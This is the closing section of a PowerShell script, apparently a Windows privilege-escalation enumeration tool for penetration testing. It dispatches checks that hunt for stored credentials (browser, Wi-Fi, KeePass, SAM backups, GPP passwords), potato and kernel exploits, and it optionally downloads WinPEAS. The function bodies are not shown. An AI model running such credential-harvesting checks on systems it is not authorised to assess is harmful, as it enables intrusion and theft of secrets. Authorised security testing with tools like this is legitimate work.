$quickWinsFound = Check-UnquotedServicePaths -or $quickWinsFound
$quickWinsFound = Check-WritableServiceBinaries -or $quickWinsFound
$quickWinsFound = Check-ModifiableServices -or $quickWinsFound
$quickWinsFound = Check-AutoLogonCredentials -or $quickWinsFound
$quickWinsFound = Check-ScheduledTasksWritable -or $quickWinsFound
$quickWinsFound = Check-TokenPrivileges -or $quickWinsFound

Write-Color "`n=== EXTENDED CHECKS ===" "Yellow"
Write-Host ""

$quickWinsFound = Check-SavedCredentials -or $quickWinsFound
$quickWinsFound = Check-PowerShellHistory -or $quickWinsFound
$quickWinsFound = Check-UnattendFiles -or $quickWinsFound
$quickWinsFound = Check-PrivilegedGroupMembership -or $quickWinsFound
$quickWinsFound = Check-GPPPasswords -or $quickWinsFound
$quickWinsFound = Check-WDigest -or $quickWinsFound
$quickWinsFound = Check-WiFiPasswords -or $quickWinsFound
$quickWinsFound = Check-WSUSNonSSL -or $quickWinsFound
$quickWinsFound = Check-KernelExploits -or $quickWinsFound

if (!$Quick -or $Full) {
    Write-Color "`n=== FULL ENUMERATION ===" "Yellow"
    Write-Host ""

    Get-SystemInfo
    Get-UserInfo
    Get-NetworkInfo
    Get-InstalledSoftware
    Check-Passwords
    Check-InterestingFiles
    Check-StartupPrograms
    Check-FirewallRules
    Check-DLLHijacking
    Check-WeakServiceRegistryACLs
    Check-UACLevel
    Check-SAMSystemBackups
    Check-StoredCredentialFiles
    Check-IISWebConfig
    Check-PrintSpooler
    Check-LAPS
    Check-CredentialManagerVault
    Check-MountedDrivesNetworkShares
    Check-AVEDREnumeration

    # EP PDF checks
    Check-PotatoAttacks
    Check-AlternateDataStreams
    Check-WinlogonCredentials
    Check-SNMPCredentials
    Check-SecureStringFiles
    Check-ThunderbirdStickyNotes
    Check-KeePassFiles
    Check-BrowserCredentials
    Check-RDPSavedConnections
}

if ($WinPEAS) {
    Write-Color "`n=== WINPEAS ===" "Yellow"
    Write-Host ""
    Download-WinPEAS
}

# Generate summary
Write-Color "`n=== SUMMARY ===" "Yellow"
Write-Host ""

if ($quickWinsFound) {
    Write-Color "[!] Quick wins found! Check: $QuickWinsFile" "Red"
} else {
    Write-Host "No quick wins found. Review full enumeration results."
}

Write-Host ""
Write-Success "Results saved to: $Output"
Write-Host ""
Write-Host "Key files:"
Write-Host "  - QUICK_WINS.txt        : High priority findings"
Write-Host "  - interesting_finds.txt : Noteworthy items"
Write-Host "  - systeminfo.txt        : System information"
Write-Host "  - privileges.txt        : Current user privileges"
Write-Host ""
]]>